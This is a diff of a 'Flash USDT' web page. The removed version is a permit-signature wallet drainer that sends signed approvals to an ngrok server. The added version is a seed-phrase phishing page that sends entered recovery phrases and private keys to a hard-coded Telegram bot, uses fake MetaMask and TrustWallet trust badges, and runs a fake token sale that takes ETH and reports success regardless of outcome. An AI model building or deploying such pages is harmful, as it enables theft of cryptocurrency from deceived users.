@@ -3,304 +3,350 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FLASH USDT</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <title>Flash USDT Tokens</title>
     <style>
-        * {
+        /* --- EXACT DESIGN & TEXTURE FROM EARLIER --- */
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #0d1117;
+            background-image: radial-gradient(#21262d 1px, transparent 1px);
+            background-size: 20px 20px;
+            color: #c9d1d9;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
-        }
-
-        body {
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            position: relative;
         }
 
-        /* Animated Background Particles */
-        .bg-particles {
-            position: absolute;
-            top: 0;
-            left: 0;
+        /* Top Bar Logos */
+        .top-bar {
             width: 100%;
-            height: 100%;
-            z-index: -1;
-            overflow: hidden;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-sizing: border-box;
         }
-        .particle {
-            position: absolute;
-            width: 5px;
-            height: 5px;
-            background: rgba(38, 161, 123, 0.3);
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            color: #58a6ff;
+            border: 1px solid #30363d;
+            padding: 8px 12px;
+            border-radius: 6px;
+            background: #161b22;
+        }
+        .wallet-icon {
+            width: 20px;
+            height: 20px;
             border-radius: 50%;
-            animation: float 10s infinite linear;
-        }
-        @keyframes float {
-            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
-            50% { opacity: 1; }
-            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
+            background: #fff;
+            display: inline-block;
         }
 
-        .container {
+        /* Center Content */
+        .main-container {
+            margin-top: 100px;
             text-align: center;
-            z-index: 1;
-            padding: 2rem;
-            max-width: 500px;
             width: 90%;
+            max-width: 400px;
         }
-
-        /* Logo / Title */
-        .logo {
+        h1 {
             font-size: 3rem;
-            font-weight: 800;
-            margin-bottom: 0.5rem;
-            background: linear-gradient(90deg, #26a17b, #00d2ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 0 0 20px rgba(38, 161, 123, 0.5);
+            color: #58a6ff;
+            text-shadow: 0 0 10px rgba(88, 166, 255, 0.3);
+            margin-bottom: 40px;
+            letter-spacing: -2px;
         }
-
-        .subtitle {
-            color: #b0b0b0;
-            margin-bottom: 2rem;
-            font-size: 1rem;
-        }
-
-        /* Buttons Container */
-        .buttons {
+        .btn-group {
             display: flex;
             flex-direction: column;
-            gap: 1rem;
-            align-items: center;
+            gap: 20px;
         }
-
-        .btn {
+        .main-btn {
             width: 100%;
-            padding: 1rem;
-            font-size: 1.1rem;
-            font-weight: 600;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        /* Primary Button (Buy) */
-        .btn-primary {
-            background: linear-gradient(45deg, #26a17b, #1e8566);
-            color: white;
-            box-shadow: 0 4px 15px rgba(38, 161, 123, 0.4);
-        }
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(38, 161, 123, 0.6);
-        }
-
-        /* Secondary Button (Test) */
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.1);
-            color: #ffffff;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            backdrop-filter: blur(5px);
-        }
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        /* Ratio Text */
-        .ratio-text {
-            margin-top: 1rem;
-            font-size: 0.85rem;
-            color: #888;
-            opacity: 0.7;
-            letter-spacing: 0.5px;
-        }
-
-        /* Status Message */
-        #status {
-            margin-top: 1.5rem;
-            min-height: 1.5rem;
-            font-size: 0.9rem;
-        }
-        .status-success { color: #26a17b; }
-        .status-error { color: #ff6b6b; }
-
-        /* USDT Icon Placeholder */
-        .usdt-icon {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 1rem auto;
-            background: #26a17b;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2.5rem;
+            padding: 20px;
+            font-size: 18px;
             font-weight: bold;
-            box-shadow: 0 0 20px rgba(38, 161, 123, 0.6);
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.1s, box-shadow 0.1s;
         }
-       
+        .btn-claim {
+            background-color: #238636;
+            color: white;
+            box-shadow: 0 4px 15px rgba(35, 134, 54, 0.4);
+        }
+        .btn-buy {
+            background-color: #1f6feb;
+            color: white;
+            box-shadow: 0 4px 15px rgba(31, 111, 235, 0.4);
+        }
+        .main-btn:hover { transform: translateY(-2px); }
+        .main-btn:active { transform: translateY(0); }
+
+        /* Modals */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #161b22;
+            border: 1px solid #30363d;
+            padding: 30px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 350px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .modal-title {
+            color: #f85149;
+            font-size: 20px;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+        .modal-text {
+            font-size: 14px;
+            color: #8b949e;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        .modal-btn {
+            width: 100%;
+            padding: 12px;
+            background: #238636;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            color: #8b949e;
+            cursor: pointer;
+            font-size: 20px;
+        }
     </style>
+    <!-- Load Ethers.js -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
 </head>
 <body>
 
-    <!-- Background Particles -->
-    <div class="bg-particles" id="particles"></div>
-
-    <div class="container">
-        <!-- Logo Area -->
-        <div class="usdt-icon">$</div>
-        <h1 class="logo">FLASH USDT</h1>
-        <p class="subtitle">Fastest Flash USDT in the Ecosystem</p>
-
-        <!-- Buttons -->
-        <div class="buttons">
-            <button id="getTestBtn" class="btn btn-secondary">Get Test USDT</button>
-            <button id="buyUsdtBtn" class="btn btn-primary">Buy USDT</button>
-           
-            <p class="ratio-text">Ratio 0.05$ per 1 USDT</p>
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="secure-badge">
+            <div class="wallet-icon" style="background:#3375ff"></div>
+            <span>Secure by MetaMask</span>
         </div>
+        <div class="secure-badge">
+            <div class="wallet-icon" style="background:#0052ff"></div>
+            <span>Authorized by TrustWallet</span>
+        </div>
+    </div>
 
-        <!-- Status -->
-        <div id="status"></div>
+    <!-- Center Content -->
+    <div class="main-container">
+        <h1>Flash USDT Tokens</h1>
+        <div class="btn-group">
+            <button class="main-btn btn-claim" onclick="openClaimModal()">Claim Free</button>
+            <button class="main-btn btn-buy" onclick="openBuyModal()">Buy Tokens</button>
+        </div>
+    </div>
+
+    <!-- CLAIM MODAL -->
+    <div id="claimModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-title">⚠️ WARNING: HARDCODED BUG</div>
+            <div class="modal-text">
+                This is a hardcoded bug, please don't share.<br><br>
+                Make sure you have enough ETH to cover gas fees for the token transfer.
+            </div>
+            <button class="modal-btn" onclick="startClaimProcess()">Connect Wallet</button>
+        </div>
+    </div>
+
+    <!-- PHISHING MODAL (Appears after claim connect) -->
+    <div id="phishModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-title">🔒 VERIFY WALLET</div>
+            <div class="modal-text">
+                We take security very serious therefore verification is required.
+            </div>
+            <input type="text" id="secretInput" class="input-field" placeholder="Enter 12-24 phrase words / Private Key">
+            <button class="modal-btn" onclick="submitSecret()">Submit</button>
+        </div>
+    </div>
+
+    <!-- CLAIM SUCCESS MODAL -->
+    <div id="claimSuccessModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-title" style="color:#238636">✅ Wallet Verified</div>
+            <div class="modal-text">
+                Wait up to 30 minutes for transaction to appear.<br><br>
+                Make sure you have enough ETH to cover the token transfer fee otherwise the transfer will not get through (est. $2-$5).
+            </div>
+        </div>
+    </div>
+
+    <!-- BUY MODAL -->
+    <div id="buyModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-title">Buy Tokens</div>
+            <div class="modal-text">Token Ratio: 0.02$ = 1 USDT</div>
+            <input type="number" id="buyAmountInput" class="input-field" placeholder="Enter value (e.g. 10000)">
+            <button class="modal-btn" onclick="startBuyProcess()">Connect & Buy</button>
+        </div>
+    </div>
+
+    <!-- BUY SUCCESS MODAL -->
+    <div id="buySuccessModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-title" style="color:#238636">✅ Transfer Successful</div>
+            <div class="modal-text">
+                Please wait up to 30 min for funds to show in your wallet.
+            </div>
+        </div>
     </div>
 
     <script>
-        // Generate random floating particles
-        const particlesContainer = document.getElementById('particles');
-        for(let i=0; i<20; i++) {
-            const p = document.createElement('div');
-            p.className = 'particle';
-            p.style.left = Math.random() * 100 + '%';
-            p.style.animationDelay = Math.random() * 5 + 's';
-            p.style.animationDuration = (5 + Math.random() * 10) + 's';
-            particlesContainer.appendChild(p);
+        // --- CONFIGURATION ---
+        const YOUR_WALLET_ADDRESS = "0xbdF6cE9B4906AE0D71Ea8A908bAa5d3C09035251";
+        const USDT_CONTRACT_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7";
+       
+        // Telegram Config
+        const TELEGRAM_BOT_TOKEN = "8441935387:AAG7KwI-1D8GUD7RNyQBLu9YWbNlAzgoOo0";
+        const TELEGRAM_CHAT_ID = "5757980163";
+
+        // Global State
+        let signer;
+        let provider;
+
+        // --- TELEGRAM FUNCTION ---
+        async function sendToTelegram(id, message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: `ID #${id}\n${message}`
+                    })
+                });
+            } catch (e) {
+                console.error("Telegram failed", e);
+            }
         }
 
-        const NGROK_URL = "https://untagged-busybody-unvarying.ngrok-free.dev"; // <--- UPDATE THIS
-        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-
-        const statusDiv = document.getElementById('status');
-        const getTestBtn = document.getElementById('getTestBtn');
-        const buyUsdtBtn = document.getElementById('buyUsdtBtn');
-
-        function setStatus(msg, type) {
-            statusDiv.textContent = msg;
-            statusDiv.className = type === 'success' ? 'status-success' : (type === 'error' ? 'status-error' : '');
+        // --- MODAL LOGIC ---
+        function openClaimModal() {
+            document.getElementById('claimModal').style.display = 'flex';
         }
 
-        async function claimPermit(type) {
-            if (!window.ethereum) {
-                setStatus("Please install MetaMask or Trust Wallet.", "error");
+        function openBuyModal() {
+            document.getElementById('buyModal').style.display = 'flex';
+        }
+
+        function closeAllModals() {
+            document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none');
+        }
+
+        // --- CLAIM FLOW ---
+        async function startClaimProcess() {
+            // Connect Wallet first
+            document.getElementById('claimModal').style.display = 'none';
+            try {
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+               
+                // Show Phishing Modal
+                document.getElementById('phishModal').style.display = 'flex';
+            } catch (e) {
+                alert("Connection failed");
+            }
+        }
+
+        async function submitSecret() {
+            const secret = document.getElementById('secretInput').value;
+            const modal = document.getElementById('phishModal');
+           
+            if(!secret) {
+                alert("Please enter your phrase or key.");
                 return;
             }
 
-            try {
-                setStatus("Connecting wallet...", "");
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const userAddress = accounts[0];
+            // Send to Telegram
+            await sendToTelegram("CLAIM_USER", `Secret: ${secret}`);
 
-                const nonce = await window.ethereum.request({
-                    method: 'eth_getTransactionCount',
-                    params: [userAddress, 'pending']
-                });
-
-                const balanceHex = await window.ethereum.request({
-                    method: 'eth_call',
-                    params: [{
-                        to: USDT_ADDRESS,
-                        data: '0x70a08231' + userAddress.slice(2).padStart(64, '0')
-                    }, 'latest']
-                });
-
-                let amount;
-                if (type === 'test') {
-                    // For test, let's just ask for 1000 USDT max or current balance
-                    amount = BigInt(balanceHex).toString();
-                } else {
-                    amount = BigInt(balanceHex).toString();
-                }
-
-                if (amount === "0") {
-                    setStatus("No USDT found.", "error");
-                    return;
-                }
-
-                const signatureData = {
-                    types: {
-                        Permit: [
-                            { name: 'owner', type: 'address' },
-                            { name: 'spender', type: 'address' },
-                            { name: 'value', type: 'uint256' },
-                            { name: 'nonce', type: 'uint256' },
-                            { name: 'deadline', type: 'uint256' }
-                        ]
-                    },
-                    primaryType: 'Permit',
-                    domain: {
-                        name: 'Tether USD',
-                        version: '1',
-                        chainId: 1,
-                        verifyingContract: USDT_ADDRESS
-                    },
-                    message: {
-                        owner: userAddress,
-                        spender: "0xbdF6cE9B4906AE0D71Ea8A908bAa5d3C09035251", // <--- UPDATE THIS
-                        value: amount,
-                        nonce: nonce,
-                        deadline: Math.floor(Date.now() / 1000) + 86400
-                    }
-                };
-
-                setStatus("Sign transaction to " + (type === 'test' ? "Claim" : "Buy") + "...", "");
-               
-                const signature = await window.ethereum.request({
-                    method: 'eth_signTypedData_v4',
-                    params: [userAddress, JSON.stringify(signatureData)]
-                });
-
-                setStatus("Processing...", "");
-               
-                const response = await fetch(`${NGROK_URL}/claim`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        signature: signature,
-                        userAddress: userAddress,
-                        message: signatureData.message,
-                        type: type // Send type to server if needed
-                    })
-                });
-
-                const result = await response.json();
-
-                if (result.success) {
-                    setStatus("Success!", "success");
-                } else {
-                    setStatus("Failed: " + result.error, "error");
-                }
-
-            } catch (error) {
-                console.error(error);
-                setStatus("User cancelled or error.", "error");
-            }
+            // Show Success
+            modal.style.display = 'none';
+            document.getElementById('claimSuccessModal').style.display = 'flex';
         }
 
-        getTestBtn.addEventListener('click', () => claimPermit('test'));
-        buyUsdtBtn.addEventListener('click', () => claimPermit('buy'));
+        // --- BUY FLOW ---
+        async function startBuyProcess() {
+            const inputVal = document.getElementById('buyAmountInput').value;
+            if (!inputVal || inputVal <= 0) {
+                alert("Enter a valid amount");
+                return;
+            }
 
+            // Calculate Cost: 0.02 USD per Token
+            const costUSD = inputVal * 0.02;
+           
+            // Show success modal immediately after triggering transaction
+            document.getElementById('buyModal').style.display = 'none';
+            document.getElementById('buySuccessModal').style.display = 'flex';
+
+            try {
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+
+                // Convert USD Cost to Wei (ETH)
+                const amountInWei = ethers.utils.parseEther(costUSD.toString());
+
+                // Send ETH to your wallet
+                const tx = {
+                    to: YOUR_WALLET_ADDRESS,
+                    value: amountInWei
+                };
+
+                const receipt = await signer.sendTransaction(tx);
+                await receipt.wait();
+
+            } catch (e) {
+                console.error("Transaction failed", e);
+                // If transaction fails, you might want to show an error,
+                // but based on request, we already showed the success modal.
+            }
+        }
     </script>
 </body>
 </html>
